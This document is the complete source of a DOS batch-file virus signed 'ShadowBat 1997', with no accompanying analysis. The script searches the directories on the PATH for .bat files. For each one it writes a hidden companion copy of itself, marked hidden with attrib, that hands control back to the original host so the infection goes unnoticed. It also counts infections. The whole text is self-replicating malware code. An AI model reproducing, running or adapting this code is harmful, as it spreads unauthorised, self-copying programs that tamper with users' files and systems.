@echo off
if %1#==## goto %2
cd>c:\cdsave$
echo.>>c:\cdsave$
echo.>c:\return$.bat
%comspec% /f/e:5000 /c%0 # S
c:
cd\
echo %%4\>enter.bat
echo cd %%4>>enter.bat
type c:\cdsave$|date|find "Enter ">set$.bat 
call set$.bat
del c:\cdsave$
del c:\enter.bat
del c:\set$.bat
del c:\return$.bat
goto R
:S
set vself=%0
%0 # A %path%
:A
shift
if %2#==# exit
if exist %2\%vself%.bat set vself=%2\%vself%.bat
if exist %2%vself%.bat set vself=%2%vself%.bat
if exist %2\%vself% set vself=%2\%vself%
if exist %2%vself% set vself=%2%vself%
if not exist %vself% goto A
%vself% # B %path%
:B
shift
if %3#==# exit
if not exist %3\nul if not exist %3nul goto B
if not exist %2\nul if not exist %2nul goto B
%3\
cd %3
if exist *.bat %comspec% /f/e:5000 /c%vself% # E %2 %3
goto B
:E
for %%i in (*.bat) do call %vself% # I %%i %3 %4
exit
:I
set new=%4\%3
if exist %4nul set new=%4%3
if exist %new% goto J
set host=%5\%3
if exist %5%3 set host=%5%3
type %vself%|find /v "DoNt% %CoPy">%new%
echo>>%new% %host% %%1 %%2 %%3 %%4 %%5 %%6 %%7 %%8 %%9 %%DoNt% %CoPy%%
attrib %new% +h
exit
:J
set count$=%count$%*
if not %count$%==*********************************** c:\return$
echo ShadowBat 1997
exit
:R
